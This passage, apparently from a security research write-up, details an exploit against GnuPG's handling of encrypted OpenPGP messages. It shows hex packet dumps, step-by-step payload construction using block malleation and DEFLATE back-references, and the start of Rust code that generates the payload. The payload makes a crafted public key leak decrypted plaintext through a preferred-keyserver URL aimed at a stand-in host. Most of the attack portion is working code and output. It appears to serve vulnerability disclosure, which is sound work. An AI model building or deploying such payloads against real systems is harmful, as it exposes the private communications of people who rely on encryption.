<span class=3D"line"><span>=E2=94=82   =E2=94=82   Algorithm: ZLIB</span></=
span>
<span class=3D"line"><span>=E2=94=82   =E2=94=82 </span></span>
<span class=3D"line"><span>=E2=94=82   =E2=94=82   00000000  a3            =
                                     CTB</span></span>
<span class=3D"line"><span>=E2=94=82   =E2=94=82   00000001     02         =
                                     algo</span></span>
<span class=3D"line"><span>=E2=94=82   =E2=94=82   00000002        78 9c 01=
 48 00 b7  ff cb 46 62 00 68 b7 04     x..H....Fb.h..</span></span>
<span class=3D"line"><span>=E2=94=82   =E2=94=82   00000010  5a ba 6f 8a 86=
 9c 9c 93  8f bf ed e1 7b 79 54 28   Z.o.........&#123;yT(</span></span>
<span class=3D"line"><span>=E2=94=82   =E2=94=82   00000020  83 ac 84 9a fc=
 07 bd 9e  03 1b c8 b2 4a d6 76 16   ............J.v.</span></span>
<span class=3D"line"><span>=E2=94=82   =E2=94=82   00000030  27 03 ce 3a f6=
 22 d0 15  c1 f5 31 2d 82 03 04 38   '..:."....1-...8</span></span>
<span class=3D"line"><span>=E2=94=82   =E2=94=82   00000040  e9 db 54 08 68=
 63 a2 d0  85 8b 95 45 dd 32 60 18   ..T.hc.....E.2&#96;.</span></span>
<span class=3D"line"><span>=E2=94=82   =E2=94=82   00000050  ae f3 fb 21 f0=
                                     ...!.</span></span>
<span class=3D"line"><span>=E2=94=82   =E2=94=82 </span></span>
<span class=3D"line"><span>=E2=94=82   =E2=94=94=E2=94=80=E2=94=80 Literal =
Data Packet, new CTB, 2 header bytes + 70 bytes</span></span>
<span class=3D"line"><span>=E2=94=82           Format: Binary data</span></=
span>
<span class=3D"line"><span>=E2=94=82           Timestamp: 2025-09-02 14:51:=
06 UTC</span></span>
<span class=3D"line"><span>=E2=94=82           Content: "%OMITTED%"...</spa=
n></span>
<span class=3D"line"><span>=E2=94=82         </span></span>
<span class=3D"line"><span>=E2=94=82           00000000  cb                =
                                 CTB</span></span>
<span class=3D"line"><span>=E2=94=82           00000001     46             =
                                 length</span></span>
<span class=3D"line"><span>=E2=94=82           00000002        62          =
                                 format</span></span>
<span class=3D"line"><span>=E2=94=82           00000003           00       =
                                 filename_len</span></span>
<span class=3D"line"><span>=E2=94=82           00000004              68 b7 =
04 5a                            date</span></span>
<span class=3D"line"><span>=E2=94=82           00000008                    =
       ba 6f 8a 86 9c 9c 93 8f           .o......</span></span>
<span class=3D"line"><span>=E2=94=82           00000010  bf ed e1 7b 79 54 =
28 83  ac 84 9a fc 07 bd 9e 03   ...&#123;yT(.........</span></span>
<span class=3D"line"><span>=E2=94=82           00000020  1b c8 b2 4a d6 76 =
16 27  03 ce 3a f6 22 d0 15 c1   ...J.v.'..:."...</span></span>
<span class=3D"line"><span>=E2=94=82           00000030  f5 31 2d 82 03 04 =
38 e9  db 54 08 68 63 a2 d0 85   .1-...8..T.hc...</span></span>
<span class=3D"line"><span>=E2=94=82           00000040  8b 95 45 dd 32 60 =
18 ae                            ..E.2&#96;..</span></span>
<span class=3D"line"><span>=E2=94=82         </span></span>
<span class=3D"line"><span>=E2=94=94=E2=94=80=E2=94=80 Modification Detecti=
on Code Packet, new CTB, 2 header bytes + 20 bytes</span></span>
<span class=3D"line"><span>        Digest: D9A58F8A66FE5014C0188F5C05E81C2A=
9E6AB3C6</span></span>
<span class=3D"line"><span>        Computed digest: D9A58F8A66FE5014C0188F5=
C05E81C2A9E6AB3C6</span></span>
<span class=3D"line"><span>        Valid: true</span></span>
<span class=3D"line"><span>      </span></span>
<span class=3D"line"><span>        00000000  d3                            =
                     CTB</span></span>
<span class=3D"line"><span>        00000001     14                         =
                     length</span></span>
<span class=3D"line"><span>        00000002        d9 a5 8f 8a 66 fe  50 14=
 c0 18 8f 5c 05 e8   digest</span></span>
<span class=3D"line"><span>        00000010  1c 2a 9e 6a b3 c6</span></span=
></code></pre><!----> <p>Of note here is that since we are working with AES=
-256-CBC, we can XOR into any 16-byte block of our choice, but the followin=
g 16 bytes will be random data. The block alignment is 18, since that is th=
e prefix for the IV + 2 bytes for session key validation.</p> <p>We can now=
 prepare our known plaintext attack. By observing plaintexts of encrypted m=
essages, the pattern becomes apparent:</p> <!----><pre class=3D"shiki githu=
b-dark-default" style=3D"background-color:#0d1117;color:#e6edf3" tabindex=
=3D"0"><code><span class=3D"line"><span>00  a3                             =
                    CTB</span></span>
<span class=3D"line"><span>01     02                                       =
       algo</span></span>
<span class=3D"line"><span>02        78 9c 01 48 00 b7  ff cb 46 62 00 68 b=
7 05     x..H....Fb.h..</span></span>
<span class=3D"line"><span>10  a7 40 47 01 c3 ff 96 6a  91 58 6a fb 52 90 0=
c ba   <a href=3D"/cdn-cgi/l/email-protection" class=3D"__cf_email__" data-=
cfemail=3D"4c620c0b6262626226621426621e">[email&#160;protected]</a>...</spa=
n></span>
<span class=3D"line"><span>20  10 e3 ec 6e d4 fa 95 76  7b b8 03 32 74 c6 e=
5 71   ...n...v&#123;..2t..q</span></span>
<span class=3D"line"><span>30  05 b1 c8 ce 9e ee be d5  7d 6a 55 1c b6 b1 5=
7 f9   ........&#125;jU...W.</span></span>
<span class=3D"line"><span>40  63 1d 98 ac 2f 58 15 9d  10 c6 cc b1 ed cf 9=
6 49   c.../X.........I</span></span>
<span class=3D"line"><span>50  09 2b 01 25 0b                              =
       .+.%.</span></span>
<span class=3D"line"><span>---</span></span>
<span class=3D"line"><span>00  a3                                          =
       CTB</span></span>
<span class=3D"line"><span>01     02                                       =
       algo</span></span>
<span class=3D"line"><span>02        78 9c 01 48 00 b7  ff cb 46 62 00 68 b=
7 05     x..H....Fb.h..</span></span>
<span class=3D"line"><span>10  e4 f8 27 bc 9c e0 16 d8  a4 3c 98 6f 82 58 f=
1 6a   ..'......&#x3C;.o.X.j</span></span>
<span class=3D"line"><span>20  11 6a 4f 21 b6 4c 02 a8  d5 78 ee 22 1c 8c 8=
c 22   .jO!.L...x."..."</span></span>
<span class=3D"line"><span>30  3d b3 ad a6 63 80 05 95  e5 d3 5e c4 a5 6d 1=
9 84   =3D...c.....^..m..</span></span>
<span class=3D"line"><span>40  98 ac 15 e9 8e 19 e1 7c  48 f3 1d 51 f1 f1 e=
9 79   .......|H..Q...y</span></span>
<span class=3D"line"><span>50  48 f7 b6 23 eb                              =
       H..#.</span></span>
<span class=3D"line"><span>---</span></span>
<span class=3D"line"><span>00  a3                                          =
       CTB</span></span>
<span class=3D"line"><span>01     02                                       =
       algo</span></span>
<span class=3D"line"><span>02        78 9c 01 48 00 b7  ff cb 46 62 00 68 b=
7 05     x..H....Fb.h..</span></span>
<span class=3D"line"><span>10  ee 91 d8 48 39 e3 db a3  fd 4e 5d dd 94 b6 4=
c 0c   ...H9....N]...L.</span></span>
<span class=3D"line"><span>20  11 85 41 5e 75 b0 8d d1  ef 27 35 a3 3d 98 2=
0 9b   ..A^u....'5.=3D. .</span></span>
<span class=3D"line"><span>30  e8 cb 30 d2 9b f6 d1 db  3e 2a 23 0b 6f 5b 5=
2 da   ..0.....>*#.o[R.</span></span>
<span class=3D"line"><span>40  a1 4d ca e7 90 88 d0 8e  77 f0 d6 40 a2 62 7=
4 e5   <a href=3D"/cdn-cgi/l/email-protection" class=3D"__cf_email__" data-=
cfemail=3D"8ba5c6a5a5a5a5a5a5fca5a5cba5e9ff">[email&#160;protected]</a>.</s=
pan></span>
<span class=3D"line"><span>50  32 42 37 25 cd                              =
       2B7%.</span></span>
<span class=3D"line"><span>---</span></span>
<span class=3D"line"><span>00  a3                                          =
       CTB</span></span>
<span class=3D"line"><span>01     02                                       =
       algo</span></span>
<span class=3D"line"><span>02        78 9c 01 48 00 b7  ff cb 46 62 00 68 b=
7 06     x..H....Fb.h..</span></span>
<span class=3D"line"><span>10  01 7a 62 2f 38 4c bf d1  9d 31 2f a2 ac 0c 3=
9 fd   .zb/8L...1/...9.</span></span>
<span class=3D"line"><span>20  9e 8c d2 5b ee d0 dc 88  73 a1 58 56 d9 a0 8=
d 10   ...[....s.XV....</span></span>
<span class=3D"line"><span>30  bf fe 6b 41 0a 91 20 d3  96 32 f4 17 7b 1f 5=
5 5c   ..kA.. ..2..&#123;.U</span></span>
<span class=3D"line"><span>40  f3 09 a7 5e f5 92 63 a2  7c b8 31 5f d8 ef d=
3 f2   ...^..c.|.1_....</span></span>
<span class=3D"line"><span>50  8f cb 00 24 18                              =
       ...$.</span></span></code></pre><!----> <p>We can deduce that the pl=
aintext of the packets is very stable on <code>a3 02 78 9c 01 48 00 b7  ff =
cb 46 62 00 68 b7</code>. This alone is not enough to do much damage, but i=
s our entrypoint.</p> <p>A payload can now be constructed, that:</p> <ul><l=
i>Starts with the original ciphertext</li> <li>Modifies the section that we=
 observed as stable to be:</li> <li>A compressed packet, with the DEFLATE a=
lgorithm (this is important since it allows back references and has no chec=
ksum that would fail)</li> <li>The compressed packet has a DEFLATE plaintex=
t block of a long size</li> <li>The plaintext starts with a Comment packet,=
 also of long size</li> <li>Then we write a block of zeroes to emulate the =
actual IV of zero</li> <li>Followed by the entire packet ciphertext, which =
now decompresses with the prefix of an open Comment packet, effectively dis=
carding the output</li> <li>After that, we abuse faulty IOBUF logic to pop =
the decryption filter without popping the decompression filter</li> <li>We =
follow up with a DEFLATE fixed block, and add the start of a public key pac=
ket</li> <li>We insert a lookback instruction, which fetches the contents o=
f the comment block into a field like the preferred keyserver URL</li> <li>=
We insert the rest of the public key packet</li></ul> <p>Or, expressed in a=
 bit more concrete notation:</p> <p>Our known AES-CFB plaintext:</p> <!----=
><pre class=3D"shiki github-dark-default" style=3D"background-color:#0d1117=
;color:#e6edf3" tabindex=3D"0"><code><span class=3D"line"><span>00 00 00 00=
 00 00 00 00  00 00 00 00 00 00 00 00 # IV</span></span>
<span class=3D"line"><span></span></span>
<span class=3D"line"><span>?? ?? ?? ?? ?? ?? ?? ??  ?? ?? ?? ?? ?? ?? ?? ??=
 # "IV"</span></span>
<span class=3D"line"><span>?? ??                                           =
 # Protection bytes</span></span>
<span class=3D"line"><span>      a3 02                                     =
 # Use zlib</span></span>
<span class=3D"line"><span>            78 9c 01 6c  00 93 ff cb 6a 62 00 68=
 # zlib header for c=3D100</span></span>
<span class=3D"line"><span>b3 03</span></span>
<span class=3D"line"><span>      ?? ?? ...                                 =
 # zlib data</span></span></code></pre><!----> <p>Effectively writable:</p>=
 <!----><pre class=3D"shiki github-dark-default" style=3D"background-color:=
#0d1117;color:#e6edf3" tabindex=3D"0"><code><span class=3D"line"><span>d2 N=
N 01                                         # SEIPv1 setup</span></span>
<span class=3D"line"><span>?? ?? ?? ?? ?? ?? ?? ??  ?? ?? ?? ?? ?? ?? ?? ??=
 # "IV"</span></span>
<span class=3D"line"><span>?? ??                                           =
 # protection bytes</span></span>
<span class=3D"line"><span>      a3 01                                     =
 # comp pkt alg=3DDEFLATE</span></span>
<span class=3D"line"><span>            00 NN NN ~N  ~N                     =
 # DF store len=3DNN</span></span>
<span class=3D"line"><span>                            d0 NN               =
 # comment pkt len=3DNN</span></span>
<span class=3D"line"><span>                                  00 00 00 00 00=
 # garbage till EoB</span></span>
<span class=3D"line"><span>00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00=
 # reset IV</span></span>
<span class=3D"line"><span>CT CT CT CT CT CT CT CT  CT CT CT CT CT CT CT CT=
 # entire ciphertext</span></span>
<span class=3D"line"><span>00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00=
 # pad 22B for MDC</span></span>
<span class=3D"line"><span>[IOBUF EOF trampoline, pop decryption filter]</s=
pan></span>
<span class=3D"line"><span>[DF store 0] [DF store 0] [DF store 0] [DF store=
 0] [...nop sled...]</span></span>
<span class=3D"line"><span>[DF store [PGP public key until unhashed subpack=
ets]]</span></span>
<span class=3D"line"><span>[DF compressed [LengthDistance pointing to decry=
pted data in compression buffer]</span></span>
<span class=3D"line"><span>[DF store [Rest of PGP public key]]</span></span=
></code></pre><!----> <p>This method of exploitation <em>somewhat</em> work=
s with <em>GnuPG</em>: Due to an implementation bug, the decompression of t=
he packet fails when processed as an <code>iobuf</code> pipeline. This is a=
n issue that could be worked around in the payload itself. To work around i=
t, we use <code>gpg --unwrap -o- | gpg</code> to decrypt the packet, which =
buffers the entire compression buffer to stdin/out first. The payload also =
does not bypass the manipulation warning in the way described above for the=
 same reason.</p> <p>A payload like this then decrypts (as observed by <cod=
e>gpg --unwrap</code>) to:</p> <!----><pre class=3D"shiki github-dark-defau=
lt" style=3D"background-color:#0d1117;color:#e6edf3" tabindex=3D"0"><code><=
span class=3D"line"><span>Compressed Data Packet, old CTB, 2 header bytes +=
 indeterminate length</span></span>
<span class=3D"line"><span>=E2=94=82   Algorithm: ZIP</span></span>
<span class=3D"line"><span>=E2=94=82 </span></span>
<span class=3D"line"><span>=E2=94=82   00000000  a3                        =
                         CTB</span></span>
<span class=3D"line"><span>=E2=94=82   00000001     01                     =
                         algo</span></span>
<span class=3D"line"><span>=E2=94=82   00000002        00 a3 00 5c ff d0  a=
1 a1 a1 a1 a1 a1 8b 27     ............'</span></span>
<span class=3D"line"><span>=E2=94=82   00000010  d1 84 ab f2 3b ab d3 5a  d=
9 9f 0e 9c 9c 6a 8f 23   ....;..Z.....j.#</span></span>
<span class=3D"line"><span>=E2=94=82   [...]</span></span>
<span class=3D"line"><span>=E2=94=82   00000170  00 a2 a1 18 68 74 74 70  3=
a 2f 2f 6c 6f 63 61 6c   ....http://local</span></span>
<span class=3D"line"><span>=E2=94=82   00000180  68 6f 73 74 3a 39 39 39  3=
9 2f 75 70 6c 6f 61 64   host:9999/upload</span></span>
<span class=3D"line"><span>=E2=94=82   00000190  2d 6b 65 79 3f 78 3d 1a  d=
0 30 07 00 e6 03 19 fc   -key?x=3D..0......</span></span>
<span class=3D"line"><span>=E2=94=82   000001a0  8c 5d 00 ff 42 0b d7 a1  c=
2 92 cc 4c c7 10 d0 8b   .]..B......L....</span></span>
<span class=3D"line"><span>=E2=94=82   000001b0  67 3a 43 ef 3f 94 c6 31  1=
d f6 4c 41 b4 7d da a9   g:C.?..1..LA.&#125;..</span></span>
<span class=3D"line"><span>=E2=94=82   [...]</span></span>
<span class=3D"line"><span>=E2=94=82   00000580  6b ce e1 08 6c 03 01 02  0=
0 fd ff d0 00            k...l........</span></span>
<span class=3D"line"><span>=E2=94=82 </span></span>
<span class=3D"line"><span>=E2=94=9C=E2=94=80=E2=94=80 OpenPGP draft commen=
t packet, new CTB, 2 header bytes + 161 bytes</span></span>
<span class=3D"line"><span>=E2=94=82       Tag: Unknown Packet 16</span></s=
pan>
<span class=3D"line"><span>=E2=94=82       Error: Unsupported packet type. =
 Tag: Unknown Packet 16</span></span>
<span class=3D"line"><span>=E2=94=82     </span></span>
<span class=3D"line"><span>=E2=94=82       00000000  d0                    =
                             CTB</span></span>
<span class=3D"line"><span>=E2=94=82       00000001     a1                 =
                             length</span></span>
<span class=3D"line"><span>=E2=94=82       00000002        a1 a1 a1 a1 a1 8=
b  27 d1 84 ab f2 3b ab d3     ......'....;..</span></span>
<span class=3D"line"><span>=E2=94=82       00000010  5a d9 9f 0e 9c 9c 6a 8=
f  23 32 77 3e b0 23 ef a4   Z.....j.#2w>.#..</span></span>
<span class=3D"line"><span>=E2=94=82       00000020  97 5b 2d 03 e4 ea 19 e=
a  19 a3 02 78 9c 01 48 00   .[-........x..H.</span></span>
<span class=3D"line"><span>=E2=94=82       00000030  b7 ff cb 46 62 00 68 b=
3  53 2f 82 23 ae 35 fe a3   ...Fb.h.S/.#.5..</span></span>
<span class=3D"line"><span>=E2=94=82       00000040  66 c7 97 26 8b 4c 24 7=
9  e1 78 84 13 1f 6d cd 4d   f..&#x26;.L$y.x...m.M</span></span>
<span class=3D"line"><span>=E2=94=82       00000050  08 77 9f 57 eb da ca 7=
7  d8 85 b9 b3 b0 72 1c ea   .w.W...w.....r..</span></span>
<span class=3D"line"><span>=E2=94=82       00000060  98 26 0f c7 9f f6 0d f=
3  5e 0e ab 82 44 7d ff 2c   .&#x26;......^...D&#125;.,</span></span>
<span class=3D"line"><span>=E2=94=82       00000070  2f e7 6e 5f a2 91 d6 7=
b  8d 4a e1 12 23 86 d3 14   /.n_...&#123;.J..#...</span></span>
<span class=3D"line"><span>=E2=94=82       00000080  46 b1 3f 5d 58 91 d1 6=
d  00 da 7a d4 1a 6d 7e ec   F.?]X..m..z..m~.</span></span>
<span class=3D"line"><span>=E2=94=82       00000090  30 59 06 ee a3 a3 a3 a=
3  a3 a3 a3 a3 a3 a3 a3 a3   0Y..............</span></span>
<span class=3D"line"><span>=E2=94=82       000000a0  a3 a3 a3              =
                             ...</span></span>
<span class=3D"line"><span>=E2=94=82     </span></span>
<span class=3D"line"><span>=E2=94=9C=E2=94=80=E2=94=80 Public-Key Packet, n=
ew CTB, 2 header bytes + 51 bytes</span></span>
<span class=3D"line"><span>=E2=94=82       [...]</span></span>
<span class=3D"line"><span>=E2=94=82     </span></span>
<span class=3D"line"><span>=E2=94=9C=E2=94=80=E2=94=80 Signature Packet, ne=
w CTB, 3 header bytes + 371 bytes</span></span>
<span class=3D"line"><span>=E2=94=82       Version: 4</span></span>
<span class=3D"line"><span>=E2=94=82       Type: DirectKey</span></span>
<span class=3D"line"><span>=E2=94=82       Pk algo: EdDSA</span></span>
<span class=3D"line"><span>=E2=94=82       Hash algo: SHA512</span></span>
<span class=3D"line"><span>=E2=94=82       Hashed area:</span></span>
<span class=3D"line"><span>=E2=94=82         [...]</span></span>
<span class=3D"line"><span>=E2=94=82       Unhashed area:</span></span>
<span class=3D"line"><span>=E2=94=82         Preferred keyserver: "http://l=
ocalhost:9999/upload-key?x=3D%OMITTED%"</span></span>
<span class=3D"line"><span>=E2=94=82       Digest prefix: 8C5D</span></span>
<span class=3D"line"><span>=E2=94=82       Level: 0 (signature over data)</=
span></span>
<span class=3D"line"><span>=E2=94=82     </span></span>
<span class=3D"line"><span>=E2=94=82       00000000  c2                    =
                             CTB</span></span>
<span class=3D"line"><span>=E2=94=82       00000001     c0 b3              =
                             length</span></span>
<span class=3D"line"><span>=E2=94=82       00000003           04           =
                             version</span></span>
<span class=3D"line"><span>=E2=94=82       [...]</span></span>
<span class=3D"line"><span>=E2=94=82       0000008c                        =
               00 a2         unhashed_area_len</span></span>
<span class=3D"line"><span>=E2=94=82       0000008e                        =
                     a1      subpacket length</span></span>
<span class=3D"line"><span>=E2=94=82       0000008f                        =
                        18   subpacket tag</span></span>
<span class=3D"line"><span>=E2=94=82       00000090  68 74 74 70 3a 2f 2f 6=
c  6f 63 61 6c 68 6f 73 74   pref key server</span></span>
<span class=3D"line"><span>=E2=94=82       000000a0  3a 39 39 39 39 2f 75 7=
0  6c 6f 61 64 2d 6b 65 79</span></span>
<span class=3D"line"><span>=E2=94=82       000000b0  3f 78 3d 8f 23 32 77 3=
e  b0 23 ef a4 97 5b 2d 03</span></span>
<span class=3D"line"><span>=E2=94=82       000000c0  e4 ea 19 ea 19 a3 02 7=
8  9c 01 48 00 b7 ff cb 46</span></span>
<span class=3D"line"><span>=E2=94=82       000000d0  62 00 68 b3 53 2f 82 2=
3  ae 35 fe a3 66 c7 97 26</span></span>
<span class=3D"line"><span>=E2=94=82       000000e0  8b 4c 24 79 e1 78 84 1=
3  1f 6d cd 4d 08 77 9f 57</span></span>
<span class=3D"line"><span>=E2=94=82       000000f0  eb da ca 77 d8 85 b9 b=
3  b0 72 1c ea 98 26 0f c7</span></span>
<span class=3D"line"><span>=E2=94=82       00000100  9f f6 0d f3 5e 0e ab 8=
2  44 7d ff 2c 2f e7 6e 5f</span></span>
<span class=3D"line"><span>=E2=94=82       00000110  a2 91 d6 7b 8d 4a e1 1=
2  23 86 d3 14 46 b1 3f 5d</span></span>
<span class=3D"line"><span>=E2=94=82       00000120  58 91 d1 6d 00 da 7a d=
4  1a 6d 7e ec 30 59 06 ee</span></span>
<span class=3D"line"><span>=E2=94=82       00000130  8c                    =
                             digest_prefix1</span></span>
<span class=3D"line"><span>=E2=94=82       00000131     5d                 =
                             digest_prefix2</span></span>
<span class=3D"line"><span>=E2=94=82       00000132        00 ff           =
                             eddsa_sig_r_len</span></span>
<span class=3D"line"><span>=E2=94=82       00000134              42 0b d7 a=
1  c2 92 cc 4c c7 10 d0 8b   eddsa_sig_r</span></span>
<span class=3D"line"><span>=E2=94=82       00000140  67 3a 43 ef 3f 94 c6 3=
1  1d f6 4c 41 b4 7d da a9</span></span>
<span class=3D"line"><span>=E2=94=82       00000150  45 e9 8c 4c</span></sp=
an>
<span class=3D"line"><span>=E2=94=82       00000154              00 fe     =
                             eddsa_sig_s_len</span></span>
<span class=3D"line"><span>=E2=94=82       00000156                    30 8=
5  30 6f d3 45 75 4d 4a 96   eddsa_sig_s</span></span>
<span class=3D"line"><span>=E2=94=82       00000160  1f 05 b5 15 49 e3 73 1=
0  e2 9c 9e 75 40 f1 0b 08</span></span>
<span class=3D"line"><span>=E2=94=82       00000170  6b 46 6c aa c8 01</spa=
n></span>
<span class=3D"line"><span>=E2=94=82     </span></span>
<span class=3D"line"><span>=E2=94=9C=E2=94=80=E2=94=80 User ID Packet, new =
CTB, 2 header bytes + 7 bytes</span></span>
<span class=3D"line"><span>=E2=94=82       Value: Mallory</span></span>
<span class=3D"line"><span>=E2=94=82     </span></span>
<span class=3D"line"><span>=E2=94=82       00000000  cd                    =
                             CTB</span></span>
<span class=3D"line"><span>=E2=94=82       00000001     07                 =
                             length</span></span>
<span class=3D"line"><span>=E2=94=82       00000002        4d 61 6c 6c 6f 7=
2  79                        value</span></span>
<span class=3D"line"><span>=E2=94=82     </span></span>
<span class=3D"line"><span>=E2=94=94=E2=94=80=E2=94=80 [...]</span></span><=
/code></pre><!----> <p><em>GnuPG</em> parses it the same way:</p> <!----><p=
re class=3D"shiki github-dark-default" style=3D"background-color:#0d1117;co=
lor:#e6edf3" tabindex=3D"0"><code><span class=3D"line"><span># off=3D0 ctb=
=3Da3 tag=3D8 hlen=3D1 plen=3D0 indeterminate</span></span>
<span class=3D"line"><span>:compressed packet: algo=3D1</span></span>
<span class=3D"line"><span># off=3D2 ctb=3Dd0 tag=3D16 hlen=3D2 plen=3D161 =
new-ctb</span></span>
<span class=3D"line"><span>:OpenPGP draft comment packet: "=C2=A1=C2=A1=C2=
=A1=C2=A1=C2=A1=C2=8B'=C3=91=C2=84=C2=AB=C3=B2;=C2=AB=C3=93Z=C3=99=C2=9F=0E=
=C2=9C=C2=9Cj=C2=8F#2w>=C2=B0#=C3=AF=C2=A4=C2=97[-=03=C3=A4=C3=AA=19=C3=AA=
=19=C2=A3=02x=C2=9C=01H=00=C2=B7=C3=BF=C3=8BFb=00h=C2=B3S/=C2=82#=C2=AE5=C3=
=BE=C2=A3f=C3=87=C2=97&#x26;=C2=8BL$y=C3=A1x=C2=84=13=1Fm=C3=8DM=08w=C2=9FW=
=C3=AB=C3=9A=C3=8Aw=C3=98=C2=85=C2=B9=C2=B3=C2=B0r=1C=C3=AA=C2=98&#x26;=0F=
=C3=87=C2=9F=C3=B6=0D=C3=B3^=0E=C2=AB=C2=82D}=C3=BF,/=C3=A7n_=C2=A2=C2=91=
=C3=96{=C2=8DJ=C3=A1=12#=C2=86=C3=93=14F=C2=B1?]X=C2=91=C3=91m=00=C3=9Az=C3=
=94=1Am~=C3=AC0Y=06=C3=AE=C2=A3=C2=A3=C2=A3=C2=A3=C2=A3=C2=A3=C2=A3=C2=A3=
=C2=A3=C2=A3=C2=A3=C2=A3=C2=A3=C2=A3=C2=A3"</span></span>
<span class=3D"line"><span># off=3D165 ctb=3Dc6 tag=3D6 hlen=3D2 plen=3D51 =
new-ctb</span></span>
<span class=3D"line"><span>:public key packet:</span></span>
<span class=3D"line"><span>        version 4, algo 22, created 1756825986, =
expires 0</span></span>
<span class=3D"line"><span>        pkey[0]: [80 bits] ed25519 (1.3.6.1.4.1.=
11591.15.1)</span></span>
<span class=3D"line"><span>        pkey[1]: [263 bits]</span></span>
<span class=3D"line"><span>        keyid: FAE0D448DABC939C</span></span>
<span class=3D"line"><span># off=3D218 ctb=3Dc2 tag=3D2 hlen=3D3 plen=3D371=
 new-ctb</span></span>
<span class=3D"line"><span>:signature packet: algo 22, keyid FAE0D448DABC93=
9C</span></span>
<span class=3D"line"><span>        version 4, created 1756825986, md5len 0,=
 sigclass 0x1f</span></span>
<span class=3D"line"><span>        digest algo 10, begin of digest 8c 5d</s=
pan></span>
<span class=3D"line"><span>        critical hashed subpkt 2 len 4 (sig crea=
ted 2025-09-02)</span></span>
<span class=3D"line"><span>        critical hashed subpkt 9 len 4 (key expi=
res after 2y362d0h0m)</span></span>
<span class=3D"line"><span>        hashed subpkt 11 len 2 (pref-sym-algos: =
9 7)</span></span>
<span class=3D"line"><span>        hashed subpkt 16 len 8 (issuer key ID FA=
E0D448DABC939C)</span></span>
<span class=3D"line"><span>        hashed subpkt 20 len 70 (notation: <a hr=
ef=3D"/cdn-cgi/l/email-protection" class=3D"__cf_email__" data-cfemail=3D"8=
7f4e6ebf3c7e9e8f3e6f3eee8e9f4a9f4e2f6f2e8eee6aaf7e0f7a9e8f5e0">[email&#160;=
protected]</a>=3D[not human readable])</span></span>
<span class=3D"line"><span>        hashed subpkt 21 len 2 (pref-hash-algos:=
 10 8)</span></span>
<span class=3D"line"><span>        critical hashed subpkt 27 len 1 (key fla=
gs: 01)</span></span>
<span class=3D"line"><span>        hashed subpkt 30 len 1 (features: 09)</s=
pan></span>
<span class=3D"line"><span>        hashed subpkt 33 len 21 (issuer fpr v4 B=
DCD90FCBC64D23C56A3A0C1FAE0D448DABC939C)</span></span>
<span class=3D"line"><span>        subpkt 24 len 160 (preferred keyserver: =
http://localhost:9999/upload-key?x=3D%OMITTED%)</span></span>
<span class=3D"line"><span>        data: [255 bits]</span></span>
<span class=3D"line"><span>        data: [254 bits]</span></span>
<span class=3D"line"><span># off=3D592 ctb=3Dcd tag=3D13 hlen=3D2 plen=3D7 =
new-ctb</span></span>
<span class=3D"line"><span>:user ID packet: "Mallory"</span></span></code><=
/pre><!----> <p>And when asked to sign the key, to upload it to a keyserver=
, or to refresh it from the preferred keyserver, the plaintext (which is a =
compressed packet, making it appear garbled, but that is the decrypted text=
!) is leaked.</p> <p>The payload is generated with this code:</p> <!----><p=
re class=3D"shiki github-dark-default" style=3D"background-color:#0d1117;co=
lor:#e6edf3" tabindex=3D"0"><code><span class=3D"line"><span>use std::env::=
args;</span></span>
<span class=3D"line"><span>use deflate::encoder_state::EncoderState;</span>=
</span>
<span class=3D"line"><span>use deflate::lzvalue::&#123;LZType, StoredLength=
&#125;;</span></span>
<span class=3D"line"><span>use sequoia_openpgp::&#123;Message, Packet, Pack=
etPile&#125;;</span></span>
<span class=3D"line"><span>use sequoia_openpgp::packet::&#123;Signature, Ta=
g, SEIP&#125;;</span></span>
<span class=3D"line"><span>use sequoia_openpgp::packet::Body::Unprocessed;<=
/span></span>
<span class=3D"line"><span>use sequoia_openpgp::parse::Parse;</span></span>
<span class=3D"line"><span>use hex_literal::hex;/</span></span>
<span class=3D"line"><span>use sequoia_openpgp::cert::CertBuilder;</span></=
span>
<span class=3D"line"><span>use sequoia_openpgp::packet::header::&#123;BodyL=
ength, CTBNew&#125;;</span></span>
<span class=3D"line"><span>use sequoia_openpgp::packet::signature::subpacke=
t::&#123;Subpacket, SubpacketValue&#125;;</span></span>
<span class=3D"line"><span>use sequoia_openpgp::serialize::&#123;Marshal&#1=
25;;</span></span>
<span class=3D"line"><span>use sequoia_openpgp::types::&#123;CompressionAlg=
orithm, SignatureType&#125;;</span></span>
<span class=3D"line"><span></span></span>
<span class=3D"line"><span>fn main() &#123;</span></span>
<span class=3D"line"><span>    let input_file =3D args().nth(1).expect("No =
valid input file");</span></span>
<span class=3D"line"><span>    let message =3D Message::from_file(input_fil=
e).expect("Input file cannot be opened");</span></span>
<span class=3D"line"><span>    let Some(Packet::SEIP(SEIP::V1(mut seip))) =
=3D message.packets().children().find(|x| x.tag() =3D=3D Tag::SEIP).cloned(=
) else &#123; panic!("Invalid input") &#125;;</span></span>
<span class=3D"line"><span>    let Unprocessed(ct) =3D seip.body().clone() =
else &#123; panic!("wtf") &#125;;</span></span>
<span class=3D"line"><span></span></span>
<span class=3D"line"><span>    let ct_align_padding =3D 16 - ct.len() % 16;=
</span></span>
<span class=3D"line"><span>    let mut out_pkgs =3D message.packets().child=
ren().filter(|x| x.tag() !=3D Tag::SEIP).cloned().collect::&#x3C;Vec&#x3C;_=
>>();</span></span>
<span class=3D"line"><span></span></span>
<span class=3D"line"><span>    // head -c64 /dev/urandom | gpg -e -r online=
 | sq packet dump --hex</span></span>
<span class=3D"line"><span>    let mut pt_comp_gpg_reference =3D hex!(/*</s=
pan></span>
<span class=3D"line"><span>        =E2=94=9C=E2=94=80=E2=94=80 Compressed D=
ata Packet, old CTB, 2 header bytes + indeterminate length</span></span>
<span class=3D"line"><span>        =E2=94=82   =E2=94=82   Algorithm: ZLIB<=
/span></span>
<span class=3D"line"><span>        =E2=94=82   =E2=94=82</span></span>
<span class=3D"line"><span>        =E2=94=82   =E2=94=82   00000000 */" a3 =
                                              "/*  CTB</span></span>
<span class=3D"line"><span>        =E2=94=82   =E2=94=82   00000001 */"    =
02                                            "/*  algo</span></span>
<span class=3D"line"><span>        =E2=94=82   =E2=94=82   00000002 */"    =
   78 9c 01 48 00 b7  ff cb 46 62 00 68 b3 52 "/*    x....w...b.h./</span><=
/span>
<span class=3D"line"><span>    */);</span></span>
<span class=3D"line"><span></span></span>
<span class=3D"line"><span>    // 00 00 00 00 00 00 00 00  00 00 00 00 00 0=
0 00 00 # IV</span></span>
<span class=3D"line"><span>    // [implicit]</span></span>
